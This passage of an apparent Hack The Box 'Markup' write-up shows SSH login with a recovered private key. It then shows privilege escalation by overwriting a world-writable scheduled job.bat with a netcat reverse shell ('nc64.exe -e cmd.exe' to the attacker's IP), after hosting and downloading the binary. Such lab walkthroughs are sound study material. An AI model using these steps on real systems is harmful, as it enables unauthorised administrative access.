</span></span><span class=line><span class=cl>+A5JZn45+sb1AUmvdJ7ZhGHhHSjDG0iZuoU66rZ9OcdOmzQxB67Em6xsl+aJp3v8HIvpEC
</span></span><span class=line><span class=cl>sfm80NKUo8dODlkkOslY4GFyxlL5CVtE89+wJUDGI0wRjB1c64R8eu3g3Zqqf7ocYVAAAA
</span></span><span class=line><span class=cl>wHnnDAKd85CgPWAUEVXyUGDE6mTyexJubnoQhqIzgTwylLZW8mo1p3XZVna6ehic01dK/o
</span></span><span class=line><span class=cl>1xTBIUB6VT00BphkmFZCfJptsHgz5AQXkZMybwFATtFSyLTVG2ZGMWvlI3jKwe9IAWTUTS
</span></span><span class=line><span class=cl>IpXkVf2ozXdLxjJEsdTno8hz/YuocEYU2nAgzhtQ+KT95EYVcRk8h7N1keIwwC6tUVlpt+
</span></span><span class=line><span class=cl>yrHXm3JYU25HdSv0TdupvhgzBxYOcpjqY2GA3i27KnpkIeRQAAAMEA2nxxhoLzyrQQBtES
</span></span><span class=line><span class=cl>h8I1FLfs0DPlznCDfLrxTkmwXbZmHs5L8pP44Ln8v0AfPEcaqhXBt9/9QU/hs4kHh5tLzR
</span></span><span class=line><span class=cl>Fl4Baus1XHI3RmLjhUCOPXabJv5gXmAPmsEQ0kBLshuIS59X67XSBgUvfF5KVpBk7BCbzL
</span></span><span class=line><span class=cl>mQcmPrnq/LNXVk8aMUaq2RhaCUWVRlAoxespK4pZ4ffMDmUe2RKIVmNJV++vlhC96yTuUQ
</span></span><span class=line><span class=cl>S/58hZP3xlNRwlfKOw1LPzjxqhY+vzAAAAwQDKOnpm/2lpwJ6VjOderUQy67ECQf339Dvy
</span></span><span class=line><span class=cl>U9wdThMBRcVpwdgl6z7UXI00cja1/EDon52/4yxImUuThOjCL9yloTamWkuGqCRQ4oSeqP
</span></span><span class=line><span class=cl>kUtQAh7YqWil1/jTCT0CujQGvZhxyRfXgbwE6NWZOEkqKh5+SbYuPk08kB9xboWWCEOqNE
</span></span><span class=line><span class=cl>vRCD2pONhqZOjinGfGUMml1UaJZzxZs6F9hmOz+WAek89dPdD4rBCU2fS3J7bs9Xx2PdyA
</span></span><span class=line><span class=cl><span class=nv>m3MVFR4sN7a1cAAAANZGFuaWVsQEVudGl0eQECAwQFBg</span><span class=o>==</span>
</span></span><span class=line><span class=cl>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><p>And now all that&rsquo;s left is to <strong>prepare</strong> it for the <em><strong>ssh</strong></em> connection.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ vim id_rsa
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ll
</span></span><span class=line><span class=cl>total 4.0K
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> htb-bluewalle htb-bluewalle 2.6K May <span class=m>24</span> 13:05 id_rsa
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ chmod <span class=m>600</span> id_rsa
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ll
</span></span><span class=line><span class=cl>total 4.0K
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> htb-bluewalle htb-bluewalle 2.6K May <span class=m>24</span> 13:05 id_rsa
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p><strong>Connecting</strong> to our <strong>target</strong> with - <em><strong>ssh -i id_rsa daniel@$rhost</strong></em> - results in us getting the <strong>user flag</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.17763.107<span class=o>]</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\U</span>sers<span class=se>\d</span>aniel&gt;whoami
</span></span><span class=line><span class=cl>markup<span class=se>\d</span>aniel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\U</span>sers<span class=se>\d</span>aniel&gt;dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is BA76-B4E3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers<span class=se>\d</span>aniel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>10/13/2021  04:43 PM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>10/13/2021  04:43 PM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>03/05/2020  06:19 AM    &lt;DIR&gt;          .ssh
</span></span><span class=line><span class=cl>03/05/2020  07:18 AM    &lt;DIR&gt;          Desktop
</span></span><span class=line><span class=cl>04/21/2020  03:34 AM    &lt;DIR&gt;          Documents
</span></span><span class=line><span class=cl>09/15/2018  12:12 AM    &lt;DIR&gt;          Downloads
</span></span><span class=line><span class=cl>09/15/2018  12:12 AM    &lt;DIR&gt;          Favorites
</span></span><span class=line><span class=cl>09/15/2018  12:12 AM    &lt;DIR&gt;          Links
</span></span><span class=line><span class=cl>09/15/2018  12:12 AM    &lt;DIR&gt;          Music
</span></span><span class=line><span class=cl>09/15/2018  12:12 AM    &lt;DIR&gt;          Pictures
</span></span><span class=line><span class=cl>09/15/2018  12:12 AM    &lt;DIR&gt;          Saved Games
</span></span><span class=line><span class=cl>09/15/2018  12:12 AM    &lt;DIR&gt;          Videos
</span></span><span class=line><span class=cl>               <span class=m>0</span> File<span class=o>(</span>s<span class=o>)</span>              <span class=m>0</span> bytes
</span></span><span class=line><span class=cl>              <span class=m>12</span> Dir<span class=o>(</span>s<span class=o>)</span>   7,389,384,704 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\U</span>sers<span class=se>\d</span>aniel&gt;cd Desktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\U</span>sers<span class=se>\d</span>aniel<span class=se>\D</span>esktop&gt;dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is BA76-B4E3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers<span class=se>\d</span>aniel<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>03/05/2020  07:18 AM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>03/05/2020  07:18 AM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>03/05/2020  07:18 AM                <span class=m>35</span> user.txt
</span></span><span class=line><span class=cl>               <span class=m>1</span> File<span class=o>(</span>s<span class=o>)</span>             <span class=m>35</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>   7,389,384,704 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\U</span>sers<span class=se>\d</span>aniel<span class=se>\D</span>esktop&gt;type user.txt
</span></span><span class=line><span class=cl>&lt;flag&gt;  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\U</span>sers<span class=se>\d</span>aniel<span class=se>\D</span>esktop&gt;
</span></span></code></pre></div><p>Goofing around a bit, we notice the <em>job.bat</em> file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\U</span>sers<span class=se>\d</span>aniel<span class=se>\D</span>esktop&gt;cd .. 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\U</span>sers<span class=se>\d</span>aniel&gt;cd ..
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\U</span>sers&gt;dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is BA76-B4E3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>03/05/2020  05:40 AM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>03/05/2020  05:40 AM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>07/28/2021  12:56 AM    &lt;DIR&gt;          Administrator
</span></span><span class=line><span class=cl>10/13/2021  09:16 AM    &lt;DIR&gt;          daniel
</span></span><span class=line><span class=cl>03/05/2020  05:11 AM    &lt;DIR&gt;          Public
</span></span><span class=line><span class=cl>               <span class=m>0</span> File<span class=o>(</span>s<span class=o>)</span>              <span class=m>0</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>5</span> Dir<span class=o>(</span>s<span class=o>)</span>   7,389,384,704 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\U</span>sers&gt;cd ..
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\&gt;</span>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is BA76-B4E3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>
</span></span><span class=line><span class=cl>03/12/2020  03:56 AM    &lt;DIR&gt;          Log-Management
</span></span><span class=line><span class=cl>09/15/2018  12:12 AM    &lt;DIR&gt;          PerfLogs
</span></span><span class=line><span class=cl>07/28/2021  02:01 AM    &lt;DIR&gt;          Program Files
</span></span><span class=line><span class=cl>09/15/2018  12:21 AM    &lt;DIR&gt;          Program Files <span class=o>(</span>x86<span class=o>)</span>
</span></span><span class=line><span class=cl>07/28/2021  03:38 AM                 <span class=m>0</span> Recovery.txt
</span></span><span class=line><span class=cl>03/05/2020  05:40 AM    &lt;DIR&gt;          Users
</span></span><span class=line><span class=cl>07/28/2021  02:16 AM    &lt;DIR&gt;          Windows
</span></span><span class=line><span class=cl>03/05/2020  10:15 AM    &lt;DIR&gt;          xampp
</span></span><span class=line><span class=cl>               <span class=m>1</span> File<span class=o>(</span>s<span class=o>)</span>              <span class=m>0</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>7</span> Dir<span class=o>(</span>s<span class=o>)</span>   7,389,384,704 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\&gt;</span><span class=nb>type</span> Recovery.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\&gt;</span><span class=nb>cd</span> Log-Management
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\L</span>og-Management&gt;dir 
</span></span><span class=line><span class=cl> Volume in drive C has no label. 
</span></span><span class=line><span class=cl> Volume Serial Number is BA76-B4E3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\L</span>og-Management
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>03/12/2020  03:56 AM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>03/12/2020  03:56 AM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>03/06/2020  02:42 AM               <span class=m>346</span> job.bat
</span></span><span class=line><span class=cl>               <span class=m>1</span> File<span class=o>(</span>s<span class=o>)</span>            <span class=m>346</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>   7,389,384,704 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\L</span>og-Management&gt;
</span></span></code></pre></div><blockquote><p>job.bat</p></blockquote><h2 id=task-8><strong>TASK 8</strong><a hidden class=anchor aria-hidden=true href=#task-8>#</a></h2><p><strong>Question</strong>: <em>What executable is mentioned in the file mentioned before?</em></p><p>Let&rsquo;s check it out.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\L</span>og-Management&gt;type job.bat 
</span></span><span class=line><span class=cl>@echo off
</span></span><span class=line><span class=cl>FOR /F <span class=s2>&#34;tokens=1,2*&#34;</span> %%V IN <span class=o>(</span><span class=s1>&#39;bcdedit&#39;</span><span class=o>)</span> DO SET <span class=nv>adminTest</span><span class=o>=</span>%%V
</span></span><span class=line><span class=cl>IF <span class=o>(</span>%adminTest%<span class=o>)==(</span>Access<span class=o>)</span> goto noAdmin
</span></span><span class=line><span class=cl><span class=k>for</span> /F <span class=s2>&#34;tokens=*&#34;</span> %%G in <span class=o>(</span><span class=s1>&#39;wevtutil.exe el&#39;</span><span class=o>)</span> DO <span class=o>(</span>call :do_clear <span class=s2>&#34;%%G&#34;</span><span class=o>)</span> 
</span></span><span class=line><span class=cl>echo.
</span></span><span class=line><span class=cl><span class=nb>echo</span> Event Logs have been cleared!
</span></span><span class=line><span class=cl>goto theEnd
</span></span><span class=line><span class=cl>:do_clear
</span></span><span class=line><span class=cl>wevtutil.exe cl %1
</span></span><span class=line><span class=cl>goto :eof
</span></span><span class=line><span class=cl>:noAdmin
</span></span><span class=line><span class=cl><span class=nb>echo</span> You must run this script as an Administrator!
</span></span><span class=line><span class=cl>:theEnd
</span></span><span class=line><span class=cl><span class=nb>exit</span>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\L</span>og-Management&gt;
</span></span></code></pre></div><p>Looking up <em><strong>wevutil</strong></em> we find the following:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs.
</span></span></code></pre></div><p>Checking out the mentioned parameters leaves us with:</p><table><thead><tr><th>Parameter</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td>{el | enum-logs}</td><td style=text-align:left>Displays the names of all logs.</td></tr><tr><td>{cl | clear-log} &lt;Logname> [/bu:&lt;Backup>]</td><td style=text-align:left>Clears events from the specified event log. The /bu option can be used to back up the cleared events.</td></tr></tbody></table><p>So in a <strong>nutshell</strong>, running the script with <em>administrator</em> <strong>privileges</strong> clears up some event logs. But what of it&rsquo;s permissions? We can use <em><strong>icacls</strong></em> to display it&rsquo;s <strong>access control list</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\L</span>og-Management&gt;icacls job.bat
</span></span><span class=line><span class=cl>job.bat BUILTIN<span class=se>\U</span>sers:<span class=o>(</span>F<span class=o>)</span>
</span></span><span class=line><span class=cl>        NT AUTHORITY<span class=se>\S</span>YSTEM:<span class=o>(</span>I<span class=o>)(</span>F<span class=o>)</span>
</span></span><span class=line><span class=cl>        BUILTIN<span class=se>\A</span>dministrators:<span class=o>(</span>I<span class=o>)(</span>F<span class=o>)</span>
</span></span><span class=line><span class=cl>        BUILTIN<span class=se>\U</span>sers:<span class=o>(</span>I<span class=o>)(</span>RX<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Successfully processed <span class=m>1</span> files<span class=p>;</span> Failed processing <span class=m>0</span> files
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\L</span>og-Management&gt;
</span></span></code></pre></div><p>The <strong>(F)</strong> at the top stands for <em>Full access</em>, which gives us <strong>permissions</strong> to modify however we see it fit.</p><blockquote><p>wevtutil.exe</p></blockquote><h2 id=submit-flag><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag>#</a></h2><p><strong>Question</strong>: <em>Submit user flag</em></p><p>It was <strong>already acquired</strong> during TASK7.</p><blockquote><p>flag</p></blockquote><h2 id=submit-flag-1><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag-1>#</a></h2><p><strong>Question</strong>: <em>Submit root flag</em></p><p>Our main idea to get to the <strong>root flag</strong> is to leverage our <strong>full access</strong> privileges on the <em>job.bat</em> file to run a <strong>reverse root/admin shell</strong> connecting back to our <strong>pwnbox</strong>. The <strong>prerequisite</strong> for this is of course, that <em>job.bat</em> is already <strong>on schedule</strong> to be run by the <strong>system</strong> (periodically with <em>administrator</em> privileges).</p><p><strong>Breaking</strong> it <strong>down</strong>:</p><ol><li>Copying a <em><strong>netcat</strong></em> binary to our <strong>target</strong> (from <strong>pwnbox</strong>, since our target is not connected to the internet).</li><li>Starting a <strong>netcat listener</strong> on the <strong>attacking machine</strong>.</li><li><strong>Overwriting</strong> <em>job.bat</em> to run a <strong>reverse shell</strong>.</li><li>Waiting for the <strong>reverse shell</strong> to connect back (on <strong>lhost</strong>).</li></ol><p>So let&rsquo;s jump right into it.</p><p><strong>Step 1</strong>: We download the <strong>netcat binary</strong> to the <strong>pwnbox</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe
</span></span><span class=line><span class=cl>--2023-05-24 17:10:37--  https://github.com/int0x33/nc.exe/raw/master/nc64.exe
</span></span><span class=line><span class=cl>Resolving github.com <span class=o>(</span>github.com<span class=o>)</span>... 140.82.121.3
</span></span><span class=line><span class=cl>Connecting to github.com <span class=o>(</span>github.com<span class=o>)</span><span class=p>|</span>140.82.121.3<span class=p>|</span>:443... connected.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>302</span> Found
</span></span><span class=line><span class=cl>Location: https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe <span class=o>[</span>following<span class=o>]</span>
</span></span><span class=line><span class=cl>--2023-05-24 17:10:38--  https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe
</span></span><span class=line><span class=cl>Resolving raw.githubusercontent.com <span class=o>(</span>raw.githubusercontent.com<span class=o>)</span>... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
</span></span><span class=line><span class=cl>Connecting to raw.githubusercontent.com <span class=o>(</span>raw.githubusercontent.com<span class=o>)</span><span class=p>|</span>185.199.108.133<span class=p>|</span>:443... connected.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Length: <span class=m>45272</span> <span class=o>(</span>44K<span class=o>)</span> <span class=o>[</span>application/octet-stream<span class=o>]</span>
</span></span><span class=line><span class=cl>Saving to: ‘nc64.exe’
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nc64.exe                100%<span class=o>[=============================</span>&gt;<span class=o>]</span>  44.21K  --.-KB/s    in 0.001s  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2023-05-24 17:10:38 <span class=o>(</span>44.5 MB/s<span class=o>)</span> - ‘nc64.exe’ saved <span class=o>[</span>45272/45272<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Then we host it by utilizing the <strong>http.server</strong> <strong>python</strong> module</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># on lhost</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ll
</span></span><span class=line><span class=cl>total 52K
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> htb-bluewalle htb-bluewalle 2.6K May <span class=m>24</span> 16:19 id_rsa
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> htb-bluewalle htb-bluewalle  45K May <span class=m>24</span> 17:10 nc64.exe
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ python -m http.server <span class=m>4444</span>
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>4444</span> <span class=o>(</span>http://0.0.0.0:4444/<span class=o>)</span> ...
</span></span></code></pre></div><p>and use <em><strong>wget</strong></em> (in powershell) on our <strong>target</strong> to download it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># on rhost</span>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\L</span>og-Management&gt;ping 1.1.1.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Pinging 1.1.1.1 with <span class=m>32</span> bytes of data:
</span></span><span class=line><span class=cl>Control-C
</span></span><span class=line><span class=cl>^C
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\L</span>og-Management&gt;powershell
</span></span><span class=line><span class=cl>Windows PowerShell
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>C<span class=o>)</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PS C:<span class=se>\L</span>og-Management&gt; wget http://10.10.14.75:4444/nc64.exe
</span></span><span class=line><span class=cl>wget : The response content cannot be parsed because the Internet Explorer engine is not      
</span></span><span class=line><span class=cl>available, or Internet Explorer<span class=err>&#39;</span>s first-launch configuration is not complete. Specify the     
</span></span><span class=line><span class=cl>UseBasicParsing parameter and try again. 
</span></span><span class=line><span class=cl>At line:1 char:1
</span></span><span class=line><span class=cl>+ wget http://10.10.14.75:4444/nc64.exe
</span></span><span class=line><span class=cl>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span></span><span class=line><span class=cl>    + CategoryInfo          : NotImplemented: <span class=o>(</span>:<span class=o>)</span> <span class=o>[</span>Invoke-WebRequest<span class=o>]</span>, NotSupportedException  
</span></span><span class=line><span class=cl>    + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Comma  
</span></span><span class=line><span class=cl>   nds.InvokeWebRequestCommand
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>PS C:<span class=se>\L</span>og-Management&gt; wget http://10.10.14.75:4444/nc64.exe -OutFile nc64.exe
</span></span><span class=line><span class=cl>PS C:<span class=se>\L</span>og-Management&gt; ls
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\L</span>og-Management
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                -------------         ------ ----
</span></span><span class=line><span class=cl>-a----         3/6/2020   1:42 AM            <span class=m>346</span> job.bat
</span></span><span class=line><span class=cl>-a----        5/24/2023   9:15 AM          <span class=m>45272</span> nc64.exe
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PS C:<span class=se>\L</span>og-Management&gt;
</span></span></code></pre></div><p><strong>Step 2</strong>: Running the <strong>netcat listener</strong> on <strong>lhost</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::4444
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:4444
</span></span></code></pre></div><p><strong>Step 3</strong>: Overwriting the <em>job.bat</em> file on <strong>rhost</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\L</span>og-Management&gt;dir 
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is BA76-B4E3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\L</span>og-Management
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>05/24/2023  09:15 AM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>05/24/2023  09:15 AM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>03/06/2020  02:42 AM               <span class=m>346</span> job.bat     
</span></span><span class=line><span class=cl>05/24/2023  09:15 AM            45,272 nc64.exe    
</span></span><span class=line><span class=cl>               <span class=m>2</span> File<span class=o>(</span>s<span class=o>)</span>         45,618 bytes      
</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>   7,367,720,960 bytes free 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\L</span>og-Management&gt;echo C:<span class=se>\L</span>og-Management<span class=se>\n</span>c64.exe -e cmd.exe 10.10.14.75 <span class=m>4444</span> &gt; 
</span></span><span class=line><span class=cl>job.bat
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\L</span>og-Management&gt;type job.bat
</span></span><span class=line><span class=cl>C:<span class=se>\L</span>og-Management<span class=se>\n</span>c64.exe -e cmd.exe 10.10.14.75 <span class=m>4444</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>daniel@MARKUP C:<span class=se>\L</span>og-Management&gt;
</span></span></code></pre></div><p><strong>Step 4</strong>: Waiting for the <strong>reverse admin shell</strong> on <strong>lhost</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::4444
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:4444
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.113.61.
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.113.61:49675.
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.17763.107<span class=o>]</span>
